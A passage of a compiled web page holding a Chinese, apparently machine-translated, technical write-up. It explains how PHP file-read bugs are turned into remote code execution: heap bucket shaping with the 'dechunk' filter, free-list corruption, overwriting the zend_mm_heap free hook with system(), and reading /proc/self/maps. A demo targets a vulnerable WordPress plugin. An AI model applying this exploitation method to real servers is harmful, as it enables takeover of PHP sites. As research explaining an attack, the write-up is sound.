\u8fd9\u4e9b\u5927\u5c0f\u7684\u5206\u914d\u65b9\u5f0f\u4e0e\u6211\u544a\u8bc9\u4f60\u7684\u65b9\u5f0f\u4e0d\u540c\uff0c\u5e76\u4e14\u5728\u91ca\u653e\u65f6\u4e0d\u4f1a\u8fdb\u5165\u53ef\u7528\u5217\u8868\u3002\u6211\u4eec\u9700\u8981\u8c03\u6574\u5b58\u50a8\u6876\u7684\u5927\u5c0f\u3002"}),"\n",(0,s.jsx)(n.h4,{id:"\u6b63\u786e\u62c6\u89e3",children:"\u6b63\u786e\u62c6\u89e3"}),"\n",(0,s.jsxs)(n.p,{children:["\u4e3a\u6b64\uff0c\u6211\u4eec\u5c06\u4f7f\u7528\u4e00\u4e2a PHP \u672a\u8bb0\u5f55\u4f46\u653b\u51fb\u8005\u6240\u719f\u77e5\u7684\u8fc7\u6ee4\u5668\uff1a ",(0,s.jsx)(n.code,{children:"dechunk"})," .\u6b64\u7b5b\u9009\u5668\u89e3\u7801 HTTP \u5206\u5757\u7f16\u7801\u7684\u5b57\u7b26\u4e32\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"HTTP-chunked \u662f\u4e00\u79cd\u975e\u5e38\u7b80\u5355\u7684\u7f16\u7801\uff0c\u60a8\u53ef\u4ee5\u5728\u5176\u4e2d\u6309\u5757\uff08\u4e0d\u662f\u5806\u5757\uff0c\u6570\u636e\u5757\uff09\u53d1\u9001\u6570\u636e\u3002\u9996\u5148\uff0c\u53d1\u9001\u4e00\u4e2a\u5927\u5c0f\u4e3a ASCII-hex\uff0c\u540e\u8ddf\u4e00\u4e2a\u6362\u884c\u7b26\uff0c\u7136\u540e\u662f\u76f8\u5e94\u5927\u5c0f\u7684\u6570\u636e\u5757\uff0c\u540e\u8ddf\u4e00\u4e2a\u6362\u884c\u7b26\u3002\u7136\u540e\uff0c\u53d1\u9001\u53e6\u4e00\u4e2a\u5927\u5c0f\u3001\u53e6\u4e00\u4e2a\u5757\u3001\u53e6\u4e00\u4e2a\u5927\u5c0f\u3001\u53e6\u4e00\u4e2a\u5757\uff0c\u5e76\u901a\u8fc7\u53d1\u9001\u5927\u5c0f 0\uff08\u96f6\uff09\u6765\u6307\u793a\u6570\u636e\u7684\u7ed3\u675f\u3002"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202501241112566.png-.png",alt:"img"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.em,{children:"\u4f7f\u7528 HTTP \u5206\u5757\u7f16\u7801\u7f16\u7801\u7684\u6570\u636e"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5728\u6b64\u793a\u4f8b\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u5757\u957f 8 \u4e2a\u5b57\u8282\uff0c\u7b2c\u4e8c\u4e2a\u5757\u957f 17 \u4e2a\u5b57\u8282 \uff0811h)\uff0c\u6700\u540e\u4e00\u4e2a\u5757\u957f 13 \u4e2a\u5b57\u8282\u3002\u5728 ing \u4e4b\u540e ",(0,s.jsx)(n.code,{children:"dechunk"})," \uff0c\u7ed3\u679c\u5c06\u662f\uff1a ",(0,s.jsx)(n.code,{children:"This is how the chunked encoding works"})," \u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u4f7f\u7528\u6b64\u8fc7\u6ee4\u5668\uff0c\u8c03\u6574\u5b58\u50a8\u6876\u7684\u5927\u5c0f\u542c\u8d77\u6765\u50cf\u662f\u513f\u620f\uff1a\u5728\u6bcf\u4e2a\u5b58\u50a8\u6876\u4e2d\uff0c\u6211\u4eec\u4ee5\u6240\u9700\u7684\u5927\u5c0f\u4e3a\u6570\u636e\u6dfb\u52a0\u524d\u7f00\uff08\u4f8b\u5982\uff0c\u7b2c\u4e00\u4e2a\u5b58\u50a8\u6876\u4e3a 0x148\uff0c\u7b2c\u4e8c\u4e2a\u5b58\u50a8\u6876\u4e3a 0x100 \u7b49\uff09\uff0c\u7136\u540e\u653e\u7f6e\u6570\u636e\uff0c\u7136\u540e\u6700\u540e\u4e00\u4e2a 0 \u8868\u793a\u6211\u4eec\u5b8c\u6210\u4e86\u3002"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202501241112567.png-.png",alt:"img"})}),"\n",(0,s.jsxs)(n.p,{children:["\u8bbe\u7f6e\u5b58\u50a8 ",(0,s.jsx)(n.code,{children:"dechunk"})," \u6876*"]}),"\n",(0,s.jsxs)(n.p,{children:["\u5b83\u770b\u8d77\u6765\u4e0d\u9519\uff0c\u4f46\u5b83\u4e0d\u8d77\u4f5c\u7528\u3002\u867d\u7136\u662f\u5355\u72ec\u5904\u7406\u7684\uff0c\u4f46\u5b58\u50a8\u6876\u4e0d\u662f\u72ec\u7acb\u7684\uff1a\u5b83\u4eec\u90fd\u88ab\u89e3\u6790\u4e3a\u4e00\u4e2a\u5927\u6d41\u3002 ",(0,s.jsx)(n.code,{children:"dechunk"})," \u5f53\u7b5b\u9009\u5668\u5904\u7406\u6d41\u65f6\uff0c\u5b83\u4f1a\u8bfb\u53d6\u7b2c\u4e00\u4e2a\u5b58\u50a8\u6876 0x148 \u4e2d\u7684\u5927\u5c0f\uff0c\u53d6\u51fa 0x148 \u4e2a\u5b57\u8282\uff0c\u7136\u540e\u8bfb\u53d6\u5927\u5c0f\u4e3a\u96f6\uff0c\u8fd9\u4f1a\u5bfc\u81f4\u5b83\u505c\u6b62\u89e3\u6790\u3002\u5b83\u4e0d\u4f1a\u8fdb\u5165\u7b2c\u4e8c\u4e2a\u6876\u3002\u5b83\u53ea\u662f\u5b8c\u5168\u505c\u6b62\u89e3\u6790\u3002\u6211\u4eec\u64cd\u4f5c\u7684\u6700\u7ec8\u7ed3\u679c\u662f\uff0c\u6211\u4eec\u4ece\u51e0\u4e2a\u6876\uff08\u597d\uff09\u56de\u5230\u4e86\u4e00\u4e2a\u6876\uff08\u574f)\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u5e78\u8fd0\u7684\u662f\uff0c\u627e\u5230\u4e00\u79cd\u65b9\u6cd5\u6765\u89c4\u907f\u8fd9\u4e00\u70b9\u5e76\u4e0d\u96be\uff1a\u5728\u6bcf\u4e2a\u5b58\u50a8\u6876\u4e2d\uff0c\u6211\u4eec\u63d0\u4f9b\u4e00\u79cd\u5927\u5c0f\u548c\u4e00\u4e2a\u6570\u636e\u5757\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u4e0d\u662f\u5929\u771f\u5730\u5199\u4e00\u4e2a\u5927\u5c0f\uff0c\u800c\u662f\u7528\u6570\u5343\u4e2a\u96f6\u586b\u5145\u5b83\uff0c\u4ee5\u4fbf\u5f97\u5230\u8fd9\u6837\u7684\u4e1c\u897f\uff1a"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202501241112568.png-.png",alt:"img"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsxs)(n.em,{children:["\u6b63\u786e\u8bbe\u7f6e\u5b58\u50a8 ",(0,s.jsx)(n.code,{children:"dechunk"})," \u6876"]})}),"\n",(0,s.jsx)(n.p,{children:"\u73b0\u5728\uff0c\u5728\u5904\u7406\u5b58\u50a8\u6876 1 \u540e\uff0cdehunk \u89e3\u6790\u5668\u8df3\u8f6c\u5230\u5b58\u50a8\u6876 2\uff0c\u51c6\u5907\u8bfb\u53d6\u65b0\u5927\u5c0f\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u5b58\u50a8\u6876 3\uff0c\u4f9d\u6b64\u7c7b\u63a8\u3002\u5b83\u6709\u6548\uff01\u73b0\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4efb\u610f\u6570\u91cf\u7684\u5b58\u50a8\u6876\uff0c\u5e76\u5177\u6709\u6240\u9700\u7684\u5927\u5c0f\u3002\u6211\u4eec\u5df2\u7ecf\u53d6\u5f97\u4e86\u5de8\u5927\u7684\u98de\u8dc3\u3002"}),"\n",(0,s.jsx)(n.h4,{id:"\u514d\u8d39\u5217\u8868\u63a7\u5236\u5199\u4ec0\u4e48\u5c31\u5199\u4ec0\u4e48",children:"\u514d\u8d39\u5217\u8868\u63a7\u5236\uff1a\u5199\u4ec0\u4e48\u5c31\u5199\u4ec0\u4e48"}),"\n",(0,s.jsxs)(n.p,{children:["\u6211\u4eec\u73b0\u5728\u7684\u76ee\u6807\u662f\u901a\u8fc7\u8986\u76d6\u503c\u4e3a 48h\uff08 ",(0,s.jsx)(n.code,{children:"H"})," \u5728 ASCII \u4e2d\uff09\u7684\u67d0\u4e2a\u6307\u9488\u7684 LSB \u6765\u66f4\u6539\u4e00\u4e9b\u7a7a\u95f2\u5217\u8868\u3002\u4e3a\u4e86\u65e0\u6761\u4ef6\u5730\u83b7\u5f97\u76f8\u540c\u7684\u6548\u679c\uff0c\u6211\u4eec\u4ee5\u5927\u5c0f\u4e3a 0x100 \u7684\u5757\u4e3a\u76ee\u6807\uff0c\u56e0\u4e3a\u5757\u5730\u5740\u7684 LSB \u59cb\u7ec8\u4e3a\u96f6\u3002\u8fd9\u610f\u5473\u7740\u6ea2\u51fa\u7684\u6548\u679c\u59cb\u7ec8\u76f8\u540c\uff1a\u5c060x48\u6dfb\u52a0\u5230\u5757\u6307\u9488\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u4e3a\u4e86\u5229\u7528\uff0c\u6211\u4eec\u9075\u5faa\u4e00\u4e2a\u975e\u5e38\u6807\u51c6\u7684 6 \u4e2a\u6b65\u9aa4\u3002\u6211\u4eec\u5c06\u5927\u5c0f\u4e3a 0x100 \u5757\u7684\u514d\u8d39\u5217\u8868\u547d\u540d\u4e3a ",(0,s.jsx)(n.code,{children:"FL[0x100]"})," \u3002"]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202501241112569.png-.png",alt:"img"}),"* ",(0,s.jsx)(n.code,{children:"FL[0x100]"})," \u63a7\u5236 ",(0,s.jsx)(n.code,{children:"FL[0x100]"}),"*"]}),"\n",(0,s.jsxs)(n.p,{children:["\u8003\u8651\u5230\u6211\u4eec\u5df2\u7ecf\u8bbe\u6cd5\u901a\u8fc7\u5206\u914d\u5927\u91cf0x100\u5757\u6765\u586b\u5145\u5806\u3002\u56e0\u6b64\uff0c\u5728\u5185\u5b58\u7684\u67d0\u4e2a\u5730\u65b9\uff0c\u6211\u4eec\u6709\u4e09\u4e2a\u8fde\u7eed\u7684\u81ea\u7531\u5757 ",(0,s.jsx)(n.code,{children:"A"})," \u3001 ",(0,s.jsx)(n.code,{children:"B"})," \u548c ",(0,s.jsx)(n.code,{children:"C"})," \uff0c ",(0,s.jsx)(n.code,{children:"A"})," \u5e76\u4e14\u662f \u7684 ",(0,s.jsx)(n.code,{children:"FL[100]"})," \u3002 ",(0,s.jsx)(n.code,{children:"A"})," \u6307\u5411 ",(0,s.jsx)(n.code,{children:"B"})," \uff0c\u800c \u6307\u5411 ",(0,s.jsx)(n.code,{children:"C"})," \u3002\u6211\u4eec\u53ef\u4ee5\u5206\u914d\u5176\u4e2d\u7684 3 \u4e2a\uff08\u7b2c 2 \u6b65\uff09\uff0c\u7136\u540e\u518d\u6b21\u91ca\u653e\u5b83\u4eec\uff08\u7b2c 3 \u6b65\uff09\u3002\u5728\u8fd9\u4e00\u70b9\u4e0a\uff0c\u514d\u8d39\u5217\u8868\u662f\u76f8\u53cd\u7684\uff1a\u6211\u4eec\u6709 ",(0,s.jsx)(n.code,{children:"C"})," \u2192 ",(0,s.jsx)(n.code,{children:"B"})," \u2192 ",(0,s.jsx)(n.code,{children:"A"})," \u3002\u7136\u540e\u6211\u4eec\u518d\u6b21\u5206\u914d\uff0c\u4f46\u8fd9\u6b21\u6211\u4eec\u5728\u504f\u79fb ",(0,s.jsx)(n.code,{children:"48h"})," \u91cf\u5904 ",(0,s.jsx)(n.code,{children:"C"})," \u653e\u7f6e\u4e00\u4e2a\u4efb\u610f\u6307\u9488 ",(0,s.jsx)(n.code,{children:"0x1122334455"})," \uff08\u6b65\u9aa4 4\uff09\u3002\u6211\u4eec\u518d\u6b21\u91ca\u653e\u5b83\u4eec\uff08\u6b65\u9aa4 5\uff09\uff0c\u5e76\u83b7\u5f97\u4e0e\u6b65\u9aa4 1 \u5b8c\u5168\u76f8\u540c\u7684\u72b6\u6001\uff0c\u4f46\u8fd9\u6b21\u7565\u6709\u4e0d\u540c\uff1a\u5728 ",(0,s.jsx)(n.code,{children:"C+48h"})," \uff0c\u6211\u4eec\u6709\u4e00\u4e2a\u4efb\u610f\u6307\u9488\u3002\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u4ece \u5757 ",(0,s.jsx)(n.code,{children:"A"})," \u6267\u884c\u6ea2\u51fa\uff0c\u8fd9\u4f1a\u79fb\u52a8\u5305\u542b\u5728 \u4e2d\u7684 ",(0,s.jsx)(n.code,{children:"B"})," \u6307\u9488\u3002\u5b83\u73b0\u5728\u6307\u5411 ",(0,s.jsx)(n.code,{children:"C+48h"})," \uff0c\u56e0\u6b64\uff0c\u514d\u8d39\u5217\u8868\u73b0\u5728 ",(0,s.jsx)(n.code,{children:"B"})," ",(0,s.jsx)(n.code,{children:"C+48h"})," \u2192\u2192 ",(0,s.jsx)(n.code,{children:"0x1122334455"})," \u3002\u518d\u5206\u914d 3 \u4e2a\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4efb\u610f\u5730\u5740\u8fdb\u884c PHP \u5206\u914d\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u4eec\u73b0\u5728\u6709\u4e00\u4e2a\u5199\u4ec0\u4e48\u7684\u5730\u65b9;\u8fd9\u5feb\u7ed3\u675f\u4e86\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u4f46\u662f\uff0c\u8ba9\u6211\u56de\u5230\u6f0f\u6d1e\u5229\u7528\u7684\u5b9e\u73b0\u4e0a\u6765\u3002\u5728\u8fd9\u91cc\u63cf\u8ff0\u7684\u5404\u4e2a\u6b65\u9aa4\u4e2d\uff0c\u6211\u4eec\u6709\u5206\u914d\u7136\u540e\u91ca\u653e\u7684\u5757\u3002\u4f46\u662f\u6211\u4eec\u65e0\u6cd5\u771f\u6b63\u6446\u8131\u6c34\u6876\uff1a\u6211\u4eec\u53ea\u80fd\u6539\u53d8\u5b83\u4eec\u7684\u5927\u5c0f\u3002\u4f46\u662f\uff0c\u6211\u4eec\u53ea\u5bf9\u5927\u5c0f0x100\u5757\u611f\u5174\u8da3\u3002\u5c31\u597d\u50cf\u5176\u4ed6\u5757\u4e0d\u5b58\u5728\u4e00\u6837\u3002\u56e0\u6b64\uff0c\u6211\u5c06\u6bcf\u4e2a\u5b58\u50a8\u6876\u6784\u5efa\u4e3a\u4e00\u4e2a HTTP \u5206\u5757\u7684\u4fc4\u7f57\u65af\u5a03\u5a03\uff1a"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202501241112570.png-.png",alt:"img"}),"\n\u4e00\u4e2a\u6c34\u6876\u7684\u4fc4\u7f57\u65af\u5a03\u5a03\uff1a\u5b83\u7684\u5927\u5c0f\u5728\u6bcf\u4e2a ",(0,s.jsx)(n.code,{children:"dechunk"})," \u6876\u4e0a\u90fd\u53d8\u5316*"]}),"\n",(0,s.jsxs)(n.p,{children:["\u5bf9\u4e8e\u6f0f\u6d1e\u5229\u7528\u7684\u6bcf\u4e2a\u6b65\u9aa4\uff0c ",(0,s.jsx)(n.code,{children:"dechunk"})," \u90fd\u4f1a\u8c03\u7528\u8fc7\u6ee4\u5668\uff1a\u56e0\u6b64\uff0c\u6bcf\u4e2a\u5b58\u50a8\u6876\u7684\u5927\u5c0f\u90fd\u4f1a\u53d1\u751f\u53d8\u5316\u3002\u6709\u4e9b\u5c3a\u5bf8\u53d80x100\uff0c\u4ece\u800c\u5728\u5265\u524a\u4e2d\u201c\u51fa\u73b0\u201d\uff0c\u6709\u4e9b\u53d8\u5c0f\uff0c\u4ece\u800c\u6d88\u5931\u3002\u5b83\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u79cd\u5b8c\u7f8e\u7684\u65b9\u5f0f\uff0c\u8ba9\u6c34\u6876\u5728\u7279\u5b9a\u65f6\u523b\u5b9e\u73b0\uff0c\u5e76\u5728\u6211\u4eec\u4e0d\u518d\u9700\u8981\u5b83\u4eec\u65f6\u5c06\u5b83\u4eec\u6254\u6389\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u8bf4\u5b8c\u8fd9\u4e9b\uff0c\u8ba9\u6211\u4eec\u5f00\u59cb\u6267\u884c\u4ee3\u7801\u3002"}),"\n",(0,s.jsx)(n.h4,{id:"\u4ee3\u7801\u6267\u884c",children:"\u4ee3\u7801\u6267\u884c"}),"\n",(0,s.jsxs)(n.p,{children:["\u867d\u7136\u6211\u4eec\u901a\u8fc7\u9605\u8bfb ",(0,s.jsx)(n.code,{children:"/proc/self/maps"})," \u6765\u67e5\u770b\u5185\u5b58\u533a\u57df\uff0c\u4f46\u6211\u4eec\u5e76\u4e0d\u786e\u5207\u5730\u77e5\u9053\u6211\u4eec\u5728\u5806\u4e2d\u7684\u4f4d\u7f6e\u3002\u5e78\u8fd0\u7684\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u627e\u5230PHP\u7684\u5806\u6765\u5b8c\u5168\u5ffd\u7565\u8fd9\u4e2a\u95ee\u9898\u3002\u7531\u4e8e\u5176\u5bf9\u9f50\u65b9\u5f0f \uff08~0x1fffff\uff09 \u548c\u5927\u5c0f \uff082MB\uff09\uff0c\u5b83\u5f88\u5bb9\u6613\u8bc6\u522b\u3002\u5728\u5b83\u7684\u9876\u90e8\u9a7b\u7559\u7740\u4e00\u4e2a ",(0,s.jsx)(n.code,{children:"zend_mm_heap"})," \u7ed3\u6784\uff0c\u5176\u4e2d\u5305\u542b\u975e\u5e38\u6709\u7528\u7684\u5b57\u6bb5\uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"struct _zend_mm_heap {\n    ...\n    int                use_custom_heap;\n    ...\n    zend_mm_free_slot *free_slot[ZEND_MM_BINS]; /* free lists for small sizes */\n    ...\n    union {\n        struct {\n            void      *(*_malloc)(size_t);\n            void       (*_free)(void*);\n            void      *(*_realloc)(void*, size_t);\n        } std;\n    } custom_heap;\n};\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u9996\u5148\uff0c\u5b83\u5305\u542b\u6240\u6709\u514d\u8d39\u5217\u8868\u3002\u901a\u8fc7\u8986\u76d6\u7a7a\u95f2\u5217\u8868\uff0c\u6211\u4eec\u5f97\u5230\u4e86\u4efb\u610f\u6570\u91cf\u7684\u4efb\u610f\u5927\u5c0f\u7684\u5199\u5165\u5185\u5bb9\u3002\u6211\u4eec\u53ef\u4ee5\u7528\u5b83\u4eec\u6765\u8986\u76d6\u6700\u540e\u4e00\u4e2a\u5b57\u6bb5 ",(0,s.jsx)(n.code,{children:"custom_heap"})," \uff0c\u8be5\u5b57\u6bb5\u5305\u542b ",(0,s.jsx)(n.code,{children:"emalloc()"})," \u548c ",(0,s.jsx)(n.code,{children:"efree()"})," \u7684 ",(0,s.jsx)(n.code,{children:"erealloc()"})," \u66ff\u4ee3\u51fd\u6570\uff08\u7c7b\u4f3c\u4e8e glibc \u4e2d\u7684 ",(0,s.jsx)(n.code,{children:"__malloc_hook"})," \u53ca\u5176\u540c\u7ea7\u51fd\u6570\uff09\u3002\u7136\u540e\uff0c\u6211\u4eec\u8bbe\u7f6e\u4e3a ",(0,s.jsx)(n.code,{children:"use_custom_heap"})," ",(0,s.jsx)(n.code,{children:"1"})," \uff0c\u5e76\u8c03\u7528 ",(0,s.jsx)(n.code,{children:"free()"})," \u4e00\u4e2a\u5b58\u50a8\u6876\uff0c\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e00\u4e2a\u5e26\u6709\u53d7\u63a7\u53c2\u6570\u7684\u4efb\u610f\u51fd\u6570\u8c03\u7528\u3002\u7531\u4e8e\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6587\u4ef6\u8bfb\u53d6\u8bbf\u95ee\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u6784\u5efa\u82b1\u54e8\u7684 ROP \u94fe\uff0c\u4f46\u6211\u4eec\u60f3\u8981\u5c3d\u53ef\u80fd\u901a\u7528\u7684\u4e1c\u897f;\u56e0\u6b64\uff0c\u6211\u8bbe\u7f6e\u4e3a ",(0,s.jsx)(n.code,{children:"custom_heap._free"})," ",(0,s.jsx)(n.code,{children:"system"})," \uff0c\u5141\u8bb8\u6211\u4eec\u4ee5 CTF \u65b9\u5f0f\u8fd0\u884c\u4efb\u610f bash \u547d\u4ee4\u3002"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.em,{children:"\u6ce8\u610f\uff1a\u6211\u9057\u6f0f\u4e86\u4e00\u4e9b\uff08\u8bb8\u591a\uff09\u5173\u4e8e\u6f0f\u6d1e\u5229\u7528\u7684\u7ec6\u8282\uff0c\u4f46\u5bf9\u6f0f\u6d1e\u8fdb\u884c\u4e86\u5927\u91cf\u8bc4\u8bba\u3002"})}),"\n",(0,s.jsx)(n.h4,{id:"\u5229\u7528\u6027\u80fd",children:"\u5229\u7528\u6027\u80fd"}),"\n",(0,s.jsxs)(n.p,{children:["\u6211\u4eec\u7684\u6f0f\u6d1e\u5229\u7528\u8fd0\u884c\u4e86 3 \u4e2a\u8bf7\u6c42\uff1a\u5b83\u4e0b\u8f7d ",(0,s.jsx)(n.code,{children:"/proc/self/maps"})," \uff0c\u5e76\u63d0\u53d6 PHP \u5806\u7684\u5730\u5740\u548c libc \u7684\u6587\u4ef6\u540d\u3002\u7136\u540e\uff0c\u5b83\u4e0b\u8f7d libc \u4e8c\u8fdb\u5236\u6587\u4ef6\u4ee5\u63d0\u53d6 \u7684 ",(0,s.jsx)(n.code,{children:"system()"})," \u5730\u5740\u3002\u6700\u540e\uff0c\u5b83\u6267\u884c\u6267\u884c\u6ea2\u51fa\u7684\u6700\u7ec8\u8bf7\u6c42\u5e76\u6267\u884c\u6211\u4eec\u7684\u4efb\u610f\u547d\u4ee4\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u5b83\u7684\u8868\u73b0\u975e\u5e38\u597d\uff1a"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:["\u9002\u7528\u4e8e\u4efb\u4f55\u76ee\u6807","\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"From PHP 7.0.0 (2015) to 8.3.7 (2024)\n\u4ece PHP 7.0.0 \uff082015\uff09 \u5230 8.3.7 \uff082024\uff09"}),"\n",(0,s.jsx)(n.li,{children:"Any PHP application: Wordpress, Laravel, etc.\n\u4efb\u4f55PHP\u5e94\u7528\u7a0b\u5e8f\uff1aWordpress\uff0cLaravel\u7b49\u3002"}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:["\u5b83\u662f100%\u53ef\u9760\u7684","\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Due to its implementation, it will never (?) produce a crash\n\u7531\u4e8e\u5b83\u7684\u5b9e\u73b0\uff0c\u5b83\u6c38\u8fdc\u4e0d\u4f1a\uff08\uff1f\uff09\u4ea7\u751f\u5d29\u6e83"}),"\n",(0,s.jsx)(n.li,{children:"A binary exploit that feels like a web exploit!\n\u611f\u89c9\u50cf\u7f51\u7edc\u6f0f\u6d1e\u7684\u4e8c\u8fdb\u5236\u6f0f\u6d1e\uff01"}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:["\u6709\u6548\u8d1f\u8f7d\u5c0f\u4e8e 1000 \u5b57\u8282","\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:["\u901a\u8fc7\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"zlib.inflate"})," \u548c\u4ec5 12 \u4e2a\u8fc7\u6ee4\u5668\uff0c\u6709\u6548\u8f7d\u8377\u975e\u5e38\u5c0f"]}),"\n",(0,s.jsx)(n.li,{children:"\u5b83\u9002\u5408 GET \u8bf7\u6c42"}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:["\u81ea\u5305\u542b\u6f0f\u6d1e\u5229\u7528","\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"\u65e0\u9700\u4ee5 GET \u6216 POST \u7684\u5f62\u5f0f\u53d1\u9001\u5176\u4ed6\u53c2\u6570\uff1a\u6f0f\u6d1e\u5229\u7528\u4f1a\u81ea\u884c\u5b8c\u6210\u6240\u6709\u64cd\u4f5c\uff0c\u4ece\u586b\u5145\u5806\u5230\u8bbe\u7f6e\u53ef\u7528\u5217\u8868\uff0c\u6700\u540e\u6267\u884c\u4ee3\u7801"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u5b83\u662f\u4e00\u4e2a\u5c0f\u4e8e 1000 \u5b57\u8282\u7684\u5355\u4e2a\u6709\u6548\u8d1f\u8f7d\uff0c\u53ef\u8fdc\u7a0b\u6267\u884c 10 \u5e74\u7684 PHP \u7248\u672c\u4ee3\u7801\u3002"}),"\n",(0,s.jsx)(n.h4,{id:"\u6f14\u793a",children:"\u6f14\u793a"}),"\n",(0,s.jsxs)(n.p,{children:["\u4e3a\u4e86\u8bf4\u660e\u8fd9\u4e00\u70b9\uff0c\u6211\u5c06\u4ee5\u8fd0\u884c\u5728 PHP 8.3.x \u4e0a\u7684 Wordpress \u5b9e\u4f8b\u4e3a\u76ee\u6807\u3002\u4e3a\u4e86\u5f15\u5165\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u6211\u6dfb\u52a0\u4e86 BuddyForms \u63d2\u4ef6 \uff08v2.7.7\uff09\uff0c\u8be5\u63d2\u4ef6\u5b58\u5728",(0,s.jsx)(n.a,{href:"https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8",children:"CVE-2023-26326"}),"\u7684\u7f3a\u9677\u3002\u8be5\u9519\u8bef\u6700\u521d\u88ab\u62a5\u544a\u4e3a PHAR \u53cd\u5e8f\u5217\u5316\u9519\u8bef\uff0c\u4f46 Wordpress \u6ca1\u6709\u4efb\u4f55\u53cd\u5e8f\u5217\u5316\u5c0f\u5de5\u5177\u94fe\u3002\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\uff0c\u76ee\u6807\u90fd\u8fd0\u884c\u5728 PHP 8+ \u4e0a\uff0c\u56e0\u6b64\u5b83\u4e0d\u5bb9\u6613\u53d7\u5230 PHAR \u653b\u51fb\u3002"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsxs)(n.em,{children:["\u6ce8\u610f\uff1a\u5982\u679c\u60a8\u9605\u8bfb",(0,s.jsx)(n.a,{href:"(https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8)",children:"\u539f\u59cb\u67e5\u627e\u5668"}),"\u7684\u516c\u544a\uff0c\u60a8\u53ef\u80fd\u4f1a\u770b\u5230\uff0c\u5728\u6587\u4ef6\u8bfb\u53d6\u57fa\u5143\u4e4b\u524d\uff0c\u4f1a\u6267\u884c\u8c03\u7528 ",(0,s.jsx)(n.code,{children:"getimagesize()"})," \u4ee5\u68c0\u67e5\u6587\u4ef6\u662f\u5426\u4e3a\u56fe\u50cf\u3002\u56e0\u6b64\uff0c\u4e3a\u4e86\u5141\u8bb8\u6f0f\u6d1e\u548c libc \u8bfb\u53d6 ",(0,s.jsx)(n.code,{children:"/proc/self/maps"})," \uff0c\u6211\u4f7f\u7528",(0,s.jsx)(n.a,{href:"https://www.ambionics.io/blog/wrapwrap-php-filters-suffix",children:"wrapwrap"})," \u4f7f\u5b83\u4eec\u770b\u8d77\u6765\u50cf GIF \u56fe\u50cf\u3002"]})}),"\n",(0,s.jsx)(n.h2,{id:"\u51b2\u51fb",children:"\u51b2\u51fb"}),"\n",(0,s.jsx)(n.p,{children:"\u5bf9PHP\u751f\u6001\u6709\u4ec0\u4e48\u5f71\u54cd\uff1f\u8fd9\u4e0d\u662f\u4e00\u4e2a\u65b0\u7684\u6f0f\u6d1e\uff0c\u800c\u662f\u6f0f\u6d1e\u7684\u65b0\u5229\u7528\u5411\u91cf\u3002\u4f46\u662f\uff0c\u6709\u591a\u79cd\u65b9\u6cd5\u53ef\u4ee5\u4f7f PHP \u8bfb\u53d6\u6587\u4ef6;\u6587\u4ef6\u8bfb\u53d6\u539f\u8bed\u5728 Web \u5e94\u7528\u7a0b\u5e8f\u4e2d\u975e\u5e38\u6d41\u884c\u3002"}),"\n",(0,s.jsx)(n.h3,{id:"\u6807\u51c6\u6c34\u69fd",children:"\u6807\u51c6\u6c34\u69fd"}),"\n",(0,s.jsxs)(n.p,{children:["\u663e\u7136\uff0cPHP \u7684\u6bcf\u4e2a\u6807\u51c6\u6587\u4ef6\u8bfb\u53d6\u63a5\u6536\u5668\u90fd\u4f1a\u53d7\u5230\u5f71\u54cd\uff1a ",(0,s.jsx)(n.code,{children:"file_get_contents()"})," \u3001\u3001 ",(0,s.jsx)(n.code,{children:"file()"})," \u3001 ",(0,s.jsx)(n.code,{children:"readfile()"})," ",(0,s.jsx)(n.code,{children:"fgets()"})," \u3001 